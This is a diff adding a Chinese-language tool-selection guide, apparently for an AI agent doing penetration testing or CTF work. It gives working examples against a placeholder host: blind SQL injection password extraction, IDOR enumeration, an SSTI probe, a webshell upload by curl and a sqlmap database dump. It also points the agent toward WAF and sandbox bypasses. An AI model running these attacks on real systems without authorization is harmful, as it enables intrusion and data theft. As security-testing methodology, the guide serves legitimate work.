@@ -1,0 +1,290 @@
+### 工具选择与行动决策指南 (Tool Selection & Action Decision Guide)
+
+## 工具选择决策树
+
+### 场景A: 需要快速探测、单步验证或API调用
+**选择**: `http_request`
+
+**适用情况**:
+- 获取网页内容
+- 提交表单（登录、注册、搜索）
+- 测试单个简单Payload
+- 验证单个HTTP请求的响应
+
+**示例**:
+```json
+{
+  "tool": "http_request",
+  "params": {
+    "url": "http://target.com/search?q={{7*7}}",
+    "method": "GET"
+  }
+}
+```
+
+### 场景B: 需要系统性、迭代性或需要处理响应逻辑的测试
+**选择**: `python_exec` (强制)
+
+**适用情况**:
+- 过滤器字符集Fuzz测试
+- SQL盲注逐字符提取
+- 参数暴力破解或枚举
+- IDOR批量测试
+- 需要循环、条件判断的任何场景
+- 需要保存中间结果或证据的测试
+
+**重要**: 不要用多个`http_request`来模拟循环
+
+**示例**:
+```json
+{
+  "tool": "python_exec",
+  "params": {
+    "code": "import requests\nchars = ['a', 'b', 'c']\nfor char in chars:\n    r = requests.get(f'http://target.com/test?q={char}')\n    print(f'{char}: {r.status_code}')"
+  }
+}
+```
+
+### 场景C: 需要执行系统命令
+**选择**: `shell_exec`
+
+**适用情况**:
+- 执行一次性的系统命令
+- 调用外部工具（curl, nmap, sqlmap等）
+- 文件操作（cat, ls, find）
+
+**优先级与安全性考虑**:
+- 优先选择非破坏性的信息收集命令 (如 `id`, `whoami`, `hostname`, `ls -la /tmp`)。
+- 仅在确认目标环境安全且授权充分的情况下，才尝试潜在破坏性或利用性命令 (如反弹 Shell)。
+
+**示例**:
+```json
+{
+  "tool": "shell_exec",
+  "params": {
+    "command": "curl -X POST http://target.com/upload -F 'file=@shell.php'"
+  }
+}
+```
+
+### 场景D: 需要专业知识或特定技术细节
+**选择**: `expert_analysis`
+
+**适用情况**:
+- 遇到特定WAF需要绕过技巧
+- 遇到特定框架需要针对性Payload
+- 标准方法全部失败需要高级技术
+- 需要最新的漏洞利用方法
+
+**示例**:
+```json
+{
+  "tool": "expert_analysis",
+  "params": {
+    "query": "Jinja2 SSTI沙箱逃逸最新绕过技巧",
+    "context": "已确认存在Jinja2模板注入，{{7*7}}返回49，但{{config}}被过滤"
+  }
+}
+```
+
+### 场景E: 需要检索历史经验或通用知识
+**选择**: `retrieve_knowledge`
+
+**适用情况**:
+- 查询CTF常见模式
+- 查询特定漏洞类型的测试方法
+- 查询工具使用文档
+
+**示例**:
+```json
+{
+  "tool": "retrieve_knowledge",
+  "params": {
+    "query": "SQL注入过滤器绕过技巧"
+  }
+}
+```
+
+## 工具选择哲学
+
+### 信息收集优先
+- 在任何攻击尝试之前，优先充分理解代码逻辑和应用结构
+- 推荐工具: `http_request`获取页面, `shell_exec`读取文件
+
+### 精确性 > 覆盖率
+- 优先选择能够精确验证单个假设的工具
+- 避免: 宽泛扫描工具（除非有明确理由）
+
+### 可控性
+- 优先选择输出清晰、易于解析和验证的工具
+- 对于长时间运行的命令，必须使用非阻塞模式并进行状态检查
+
+### 知识检索/专家分析作为后盾
+- 当内置工具和基本Payload无法取得进展时
+- 或遇到特定的WAF、框架、编码问题时
+- 必须使用`retrieve_knowledge` → `expert_analysis`请求最新的、更具体的攻击技术
+
+### 编码与过滤验证
+- 当需要验证"编码/原样发送/过滤效果"时
+- 优先使用`http_request`的`raw_mode`搭配合适的`Content-Type`
+- 批量变体与差异分析必须用`python_exec`实现脚本化迭代
+
+## 特殊场景工具选择
+
+### 盲注场景
+**必须使用**: `python_exec`
+
+**原因**: 需要循环、条件判断、结果聚合
+
+**示例**: 布尔盲注逐字符提取
+```python
+import requests
+result = ""
+for i in range(1, 20):
+    for c in range(32, 127):
+        payload = f"admin' AND ASCII(SUBSTR(password,{i},1))={c}--"
+        r = requests.get(f"http://target.com/login?user={payload}")
+        if "Welcome" in r.text:
+            result += chr(c)
+            break
+print(f"Extracted: {result}")
+```
+
+### 过滤器Fuzz
+**必须使用**: `python_exec`
+
+**原因**: 需要批量测试并记录结果
+
+**示例**: 字符过滤测试
+```python
+import requests
+chars = ["'", '"', '<', '>', '{', '}', ';', '|']
+for char in chars:
+    r = requests.get(f"http://target.com/search?q=test{char}test")
+    print(f"{char}: status={r.status_code}, len={len(r.text)}")
+```
+
+### 参数枚举（IDOR）
+**必须使用**: `python_exec`
+
+**原因**: 需要循环测试多个ID值
+
+**示例**: 用户ID枚举
+```python
+import requests
+for user_id in range(1, 100):
+    r = requests.get(f"http://target.com/profile?id={user_id}")
+    if r.status_code == 200 and "email" in r.text:
+        print(f"Found: id={user_id}")
+```
+
+### 单次Payload验证
+**可以使用**: `http_request`
+
+**原因**: 只需要一次请求
+
+**示例**: SSTI探针
+```json
+{
+  "tool": "http_request",
+  "params": {
+    "url": "http://target.com/render?template={{7*7}}",
+    "method": "GET"
+  }
+}
+```
+
+### 调用自动化工具
+**使用**: `shell_exec`
+
+**示例**: 调用sqlmap
+```json
+{
+  "tool": "shell_exec",
+  "params": {
+    "command": "sqlmap -u 'http://target.com/search?id=1' --batch --dump"
+  }
+}
+```
+
+## 反模式（注意与避免）
+
+### ❌ 向量固化 (Vector Fixation)
+**问题**: 在一个注入点上连续失败后，重复尝试相似的Payload
+
+**正确做法**: 
+- 立即停止并重新评估
+- 切换到不同的参数、功能点或漏洞假设
+- 或触发知识检索/专家分析
+
+### ❌ 假设跳跃 (Assumption Leap)
+**问题**: 基于微弱证据直接跳到复杂攻击
+
+**错误示例**: 发现开放的80端口 → 直接尝试Webshell上传
+
+**正确流程**: 
+1. 信息收集（获取页面、识别技术栈）
+2. 漏洞识别（发现上传功能）
+3. 漏洞验证（测试文件类型过滤）
+4. 漏洞利用（上传Webshell）
+
+### ❌ 用多个http_request模拟循环
+**问题**: 
+```json
+[
+  {"tool": "http_request", "params": {"url": "...?id=1"}},
+  {"tool": "http_request", "params": {"url": "...?id=2"}},
+  {"tool": "http_request", "params": {"url": "...?id=3"}}
+]
+```
+
+**正确做法**: 使用`python_exec`实现循环
+
+### ❌ 无假设的工具调用
+**问题**: "尝试一下nmap扫描看看"（没有明确假设）
+
+**正确做法**: "假设目标开放了数据库端口，使用nmap -p 3306,5432,27017验证"
+
+## 决策流程图
+
+```
+开始
+ ↓
+是否有明确假设？
+ ├─ 否 → 停止，先形成假设
+ └─ 是 ↓
+     是否需要循环/迭代？
+      ├─ 是 → 使用 python_exec
+      └─ 否 ↓
+          是否需要系统命令？
+           ├─ 是 → 使用 shell_exec
+           └─ 否 ↓
+               是否是单个HTTP请求？
+                ├─ 是 → 使用 http_request
+                └─ 否 ↓
+                    是否需要专业知识？
+                     ├─ 是 → 使用 expert_analysis
+                     └─ 否 → 使用 retrieve_knowledge
+```
+
+## 早停与切换机制
+
+### 早停触发条件
+- 连续两轮无新证据
+- 连续两轮无状态变化
+- 假设被证伪（L4_FALSIFIED）
+
+### 切换策略
+1. 执行失败归因（L0-L5）
+2. 根据归因结果:
+   - L1/L2 → 修复工具调用或前提条件
+   - L3 → 切换绕过策略或攻击向量
+   - L4 → 形成新假设
+   - L5 → 请求Planner重新规划
+
+### 知识检索升级
+- 标准方法失败后
+- 遇到特定技术栈/WAF
+- 需要最新绕过技巧时
+
+触发: `retrieve_knowledge` → 如果仍无效 → `expert_analysis`
